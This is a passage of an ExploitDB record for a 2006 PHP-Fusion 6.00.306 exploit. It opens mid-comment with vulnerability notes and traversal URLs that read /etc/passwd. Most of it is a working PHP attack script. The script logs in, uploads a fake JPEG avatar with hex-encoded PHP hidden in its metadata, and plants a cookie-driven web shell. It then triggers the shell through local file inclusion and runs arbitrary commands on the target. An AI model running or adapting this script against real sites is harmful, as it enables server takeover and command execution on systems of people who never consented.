metadata\r\n   content.\r\n   It seems that Apache mod_mime module considers double-extension files like\r\n   file.php.gif[somefakechars] to be valid PHP files and runs the arbitrary\r\n   code that has been uploaded. Actually I can\'t say which Apache versions, this\r\n   was tested against Apache/1.3.27 with PHP/4.3.3\r\n\r\n   A note: file is renamed like this\r\n   .php.php[user_id].gif-fakechars-\r\n\r\n   ii) vulnerable code in infusions/last_seen_users_panel/last_seen_users_panel.php\r\n       at lines 12-16:\r\n\r\n   ...\r\n   if (file_exists(INFUSIONS."last_seen_users_panel/locale/".$settings[\'locale\'].".php")) {\r\n\tinclude INFUSIONS."last_seen_users_panel/locale/".$settings[\'locale\'].".php";\r\n} else {\r\n\tinclude INFUSIONS."last_seen_users_panel/locale/English.php";\r\n}\r\n   ...\r\n\r\n    $settings[\'locale\'] var is not properly sanitized before to be used to\r\n    include files so, if register_globals=on & magic_quotes_gpc=Off,\r\n    you can include local resources, poc:\r\n\r\n    http://[target]/[path]infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=../../../../../../../../../etc/passw%00\r\n    http://[target]/[path]infusions/last_seen_users_panel/last_seen_users_panel.php?cmd=ls%20-la&settings[locale]=../../../../images/avatars/suntzu[1].jpg%00\r\n\r\n    A note: if INFUSIONS constant is not defined, PHP will assume it as it is,\r\n    as "INFUSIONS" string. On some system , no matters if "INFUSIONSlast_seen_users_panel/locale/........"\r\n    path does not exist, you will go up from the non-existent dir of exactly four\r\n    dirs to include the malicious avatar.\r\n    This works against on 6.00.306\r\n\r\n    iii) vulnerable code in setup.php at lines 14-15:\r\n\r\n    ...\r\n    $localeset = (isset($_GET[\'localeset\']) ? $_GET[\'localeset\'] : "English");\r\n    include "locale/".$localeset."/setup.php";\r\n    ...\r\n\r\n    if this script is not deleted after installation, if magic_quotes_gpc=Off,\r\n    you can include files from locale resources, poc:\r\n\r\n    http://[target]/[path]/setup.php?localeset=../../../../../../../../../../etc/passwd%00\r\n    http://[target]/[path]/setup.php?cmd=ls%20-la&localeset=../images/avatars/suntzu[1].jpg%00\r\n\r\n    this tool tries to exploit all theese vulnerabilities, you need a valid user\r\n    account to upload avatars\r\n*/\r\n\r\nerror_reporting(0);\r\nini_set("max_execution_time",0);\r\nini_set("default_socket_timeout",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result=\'\';$exa=\'\';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.="  .";}\r\n   else\r\n   {$result.="  ".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=" ".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=" 0".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.="\\r\\n"; $exa.="\\r\\n";}\r\n  }\r\n return $exa."\\r\\n".$result;\r\n}\r\n$proxy_regex = \'(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)\';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy==\'\') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo \'No response from \'.$host.\':\'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo \'Not a valid proxy...\';die;\r\n    }\r\n    $parts=explode(\':\',$proxy);\r\n    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\\r\\n";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo \'No response from proxy...\';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy==\'\') {\r\n    $html=\'\';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html=\'\';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo "\\r\\n".$html;\r\n\r\n}\r\nfunction sendpacketiii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy==\'\') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo \'No response from \'.$host.\':\'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo \'Not a valid proxy...\';die;\r\n    }\r\n    $parts=explode(\':\',$proxy);\r\n    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\\r\\n";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo \'No response from proxy...\';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  fclose($ock);\r\n  #debug\r\n  #echo "\\r\\n".$html;\r\n\r\n}\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$username=$argv[3];\r\n$pass=$argv[4];\r\n$cmd="";$port=80;$proxy="";\r\nfor ($i=5; $i<=$argc-1; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>"-p") and ($temp<>"-P"))\r\n{$cmd.=" ".$argv[$i];}\r\nif ($temp=="-p")\r\n{\r\n  $port=str_replace("-p","",$argv[$i]);\r\n}\r\nif ($temp=="-P")\r\n{\r\n  $proxy=str_replace("-P","",$argv[$i]);\r\n}\r\n}\r\n$cmd=urlencode($cmd);\r\nif (($path[0]<>\'/\') or ($path[strlen($path)-1]<>\'/\')) {echo \'Error... check the path!\'; die;}\r\nif ($proxy==\'\') {$p=$path;} else {$p=\'http://\'.$host.\':\'.$port.$path;}\r\n\r\n$mypaths= array (\r\n\t\t \'images/avatars/\',\r\n\t\t \'\',\r\n\t\t \'infusions/last_seen_users_panel/\'\r\n\t\t);\r\n\r\necho "step 0 -> Check if suntzu.php is already installed...\\r\\n";\r\nfor ($i=0; $i<=count($mypaths)-1; $i++)\r\n{\r\n$packet ="GET ".$p.$mypaths[$i]."suntzu.php HTTP/1.0\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Cookie: cmd=".$cmd.";\\r\\n";\r\n$packet.="Connection: Close\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (strstr($html,"56789"))\r\n{\r\n  echo "Exploit succeeded...";\r\n  $temp=explode("56789",$html);\r\n  die("\\r\\n".$temp[1]."\\r\\n");\r\n}\r\n}\r\n\r\necho "step 1 -> login...\\r\\n";\r\n$data ="user_name=".urlencode(trim($username));\r\n$data.="&user_pass=".urlencode(trim($pass));\r\n$data.="&login=Login";\r\n$packet="POST ".$p."news.php HTTP/1.0\\r\\n";\r\n$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n";\r\n$packet.="Referer: http://".$host.$path."news.php\\r\\n";\r\n$packet.="Accept-Language: en\\r\\n";\r\n$packet.="Content-Type: application/x-www-form-urlencoded\\r\\n";\r\n$packet.="Accept-Encoding: gzip, deflate\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Content-Length: ".strlen($data)."\\r\\n";\r\n$packet.="Connection: Keep-Alive\\r\\n";\r\n$packet.="Cache-Control: no-cache\\r\\n";\r\n$packet.="Cookie: fusion_visited=yes; PHPSESSID=44ab49664b56b97036425427b1ffb8cf\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n$temp=explode("Set-Cookie: ",$html);\r\n$temp2=explode(\' \',$temp[1]);\r\n$cookie=$temp2[0];\r\necho \'Your cookie: \'.$cookie."\\r\\n";\r\n$temp=explode("fusion_user=",$cookie);\r\n$temp2=explode(".",$temp[1]);\r\n$user_id=trim($temp2[0]);\r\necho \'Your user id: \'.$user_id."\\r\\n";\r\n\r\necho "step 2 -> upload a malicious avatar with php code inside...\\r\\n";\r\n$avatar=".php.php.gif-fakechars-";\r\n$shell=\r\nchr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0x07).chr(0x3c).chr(0x3f).\r\nchr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x24).chr(0x66).chr(0x70).\r\nchr(0x3d).chr(0x66).chr(0x6f).chr(0x70).chr(0x65).chr(0x6e).chr(0x28).chr(0x22).\r\nchr(0x73).chr(0x75).chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).\r\nchr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).chr(0x29).\r\nchr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).chr(0x73).\r\nchr(0x28).chr(0x24).chr(0x66).chr(0x70).chr(0x2c).chr(0x22).chr(0x3c).chr(0x3f).\r\nchr(0x70).chr(0x68).chr(0x70).chr(0x20).chr(0x65).chr(0x72).chr(0x72).chr(0x6f).\r\nchr(0x72).chr(0x5f).chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).chr(0x74).\r\nchr(0x69).chr(0x6e).chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).chr(0x73).\r\nchr(0x65).chr(0x74).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x5f).\r\nchr(0x6c).chr(0x69).chr(0x6d).chr(0x69).chr(0x74).chr(0x28).chr(0x30).chr(0x29).\r\nchr(0x3b).chr(0x69).chr(0x66).chr(0x20).chr(0x28).chr(0x67).chr(0x65).chr(0x74).\r\nchr(0x5f).chr(0x6d).chr(0x61).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).chr(0x71).\r\nchr(0x75).chr(0x6f).chr(0x74).chr(0x65).chr(0x73).chr(0x5f).chr(0x67).chr(0x70).\r\nchr(0x63).chr(0x28).chr(0x29).chr(0x29).chr(0x20).chr(0x7b).chr(0x5c).chr(0x24).\r\nchr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).\r\nchr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x3d).chr(0x73).chr(0x74).chr(0x72).\r\nchr(0x69).chr(0x70).chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).chr(0x65).\r\nchr(0x73).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).\r\nchr(0x4b).chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).\r\nchr(0x29).chr(0x3b).chr(0x7d).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).\r\nchr(0x35).chr(0x36).chr(0x37).chr(0x38).chr(0x39).chr(0x3b).chr(0x70).chr(0x61).\r\nchr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).\r\nchr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).\r\nchr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).chr(0x3b).chr(0x65).\r\nchr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x35).chr(0x36).chr(0x37).chr(0x38).\r\nchr(0x39).chr(0x3b).chr(0x3f).chr(0x3e).chr(0x22).chr(0x29).chr(0x3b).chr(0x0d).\r\nchr(0x0a).chr(0x66).chr(0x63).chr(0x6c).chr(0x6f).chr(0x73).chr(0x65).chr(0x28).\r\nchr(0x24).chr(0x66).chr(0x70).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).\r\nchr(0x68).chr(0x6d).chr(0x6f).chr(0x64).chr(0x28).chr(0x22).chr(0x73).chr(0x75).\r\nchr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).chr(0x68).chr(0x70).\r\nchr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).chr(0x3b).chr(0x0d).\r\nchr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).\r\nchr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).\r\nchr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).\r\nchr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).\r\nchr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).\r\nchr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).\r\nchr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).\r\nchr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x08).\r\nchr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).\r\nchr(0x00).chr(0x15).chr(0x01).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0x08).chr(0x09).chr(0xff).chr(0xc4).chr(0x00).\r\nchr(0x14).chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).\r\nchr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).\r\nchr(0x01).chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).\r\nchr(0x00).chr(0x23).chr(0x94).chr(0x09).chr(0x2e).chr(0xff).chr(0xd9).chr(0x00);\r\n\r\n/*\r\nthis image has this code inside as EXIF metadata content\r\n<?php\r\n$fp=fopen("suntzu.php","w");\r\nfputs($fp,"<?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\\$_COOKIE[cmd]=stripslashes(\\$_COOKIE[cmd]);}echo 56789;passthru(\\$_COOKIE[cmd]);echo 56789;?>");\r\nfclose($fp);\r\nchmod("suntzu.php",777);\r\n?>\r\n*/\r\n\r\n$data=\'-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_name"\r\n\r\n\'.$username.\'\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_newpassword"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_newpassword2"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_email"\r\n\r\nsucccccccp@hotmail.com\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_hide_email"\r\n\r\n1\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_location"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_month"\r\n\r\n--\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_day"\r\n\r\n--\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_year"\r\n\r\n----\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_aim"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_icq"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_msn"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_yahoo"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_web"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_theme"\r\n\r\nDefault\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_offset"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_avatar"; filename="\'.$avatar.\'"\r\nContent-Type: application/octet-stream\r\n\r\n\'.$shell.\'\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_sig"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_hash"\r\n\r\n\'.md5($pass).\'\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="update_profile"\r\n\r\nUpdate Profile\r\n-----------------------------7d6ee3a7074a--\r\n\';\r\n\r\n\r\n$packet ="POST ".$p."edit_profile.php? HTTP/1.0\\r\\n";\r\n$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n";\r\n$packet.="Referer: http://".$host.$path."edit_profile.php\\r\\n";\r\n$packet.="Accept-Language: en\\r\\n";\r\n$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6ee3a7074a\\r\\n";\r\n$packet.="Accept-Encoding: gzip, deflate\\r\\n";\r\n$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Content-Length: ".strlen($data)."\\r\\n";\r\n$packet.="Connection: Keep-Alive\\r\\n";\r\n$packet.="Cookie: fusion_visited=yes; ".$cookie." PHPSESSID=44ab49664b56b97036425427b1ffb8cf\\r\\n";\r\n$packet.="Cache-Control: no-cache\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketiii($packet);\r\n\r\necho "step 3 -> try to launch code inside image before has chmod()...\\r\\n";\r\nfor ($i=0; $i<=9; $i++)\r\n{\r\n$packet ="GET ".$p."images/avatars/.php.php[".$user_id."].gif-fakechars- HTTP/1.1\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Connection: Close\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n}\r\n\r\necho "step 3b -> try to include through last_seen_users_panel.php\\r\\n";\r\n//works with register_globals=on & magic_quotes_gpc=off\r\n$xpl=urlencode("../../../../images/avatars/.php.php[".$user_id."].gif-fakechars-".chr(0x00));\r\n$packet ="GET ".$p."infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=$xpl HTTP/1.0\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Connection: Close\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\necho "step 3c -> try to include through setup.php script\\r\\n";\r\n//works with magic_quotes_gpc=off\r\n$xpl=urlencode("../images/avatars/.php.php[".$user_id."].gif-fakechars-".chr(0x00));\r\n$packet ="GET ".$p."setup.php?localeset=$xpl HTTP/1.0\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Connection: Close\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\necho "step 4 -> delete avatar...\\r\\n";\r\n$data=\'-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_name"\r\n\r\n\'.$username.\'\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_newpassword"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_newpassword2"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_email"\r\n\r\nwhattttt@hotmail.com\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_hide_email"\r\n\r\n1\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_location"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_month"\r\n\r\n--\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_day"\r\n\r\n--\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_year"\r\n\r\n----\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_aim"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_icq"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_msn"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_yahoo"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_web"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_theme"\r\n\r\nDefault\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_offset"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_avatar"; filename="whatever"\r\nContent-Type: application/octet-stream\r\n\r\nwhat\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_sig"\r\n\r\n\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="user_hash"\r\n\r\n\'.md5($pass).\'\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="update_profile"\r\n\r\nUpdate Profile\r\n-----------------------------7d6ee3a7074a\r\nContent-Disposition: form-data; name="del_avatar"\r\n\r\ny\r\n-----------------------------7d6ee3a7074a--\r\n\';\r\n\r\n$packet ="POST ".$p."edit_profile.php HTTP/1.0\\r\\n";\r\n$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n";\r\n$packet.="Referer: http://".$host.$path."edit_profile.php\\r\\n";\r\n$packet.="Accept-Language: en\\r\\n";\r\n$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6ee3a7074a\\r\\n";\r\n$packet.="Accept-Encoding: gzip, deflate\\r\\n";\r\n$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Content-Length: ".strlen($data)."\\r\\n";\r\n$packet.="Connection: Keep-Alive\\r\\n";\r\n$packet.="Cookie: fusion_visited=yes; ".$cookie." PHPSESSID=44ab49664b56b97036425427b1ffb8cf\\r\\n";\r\n$packet.="Cache-Control: no-cache\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\necho "step 5 -> launch commands...\\r\\n";\r\nfor ($i=0; $i<=count($mypaths)-1; $i++)\r\n{\r\n$packet ="GET ".$p.$mypaths[$i]."suntzu.php HTTP/1.0\\r\\n";\r\n$packet.="Host: ".$host."\\r\\n";\r\n$packet.="Cookie: cmd=".$cmd.";\\r\\n";\r\n$packet.="Connection: Close\\r\\n\\r\\n";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (strstr($html,"56789"))\r\n{\r\n  echo "Exploit succeeded...";\r\n  $temp=explode("56789",$html);\r\n  die("\\r\\n".$temp[1]."\\r\\n");\r\n}\r\n}\r\n//if you are here...\r\necho "\\r\\nExploit failed...";\r\n?>\r\n\r\n# milw0rm.com [2006-05-07]', u'description': u'PHP-Fusion 6.00.306 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'rgod', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-05-07T00:00:00+00:00', u'_id': 1760, u'type': u'webapps', u'port': 0}

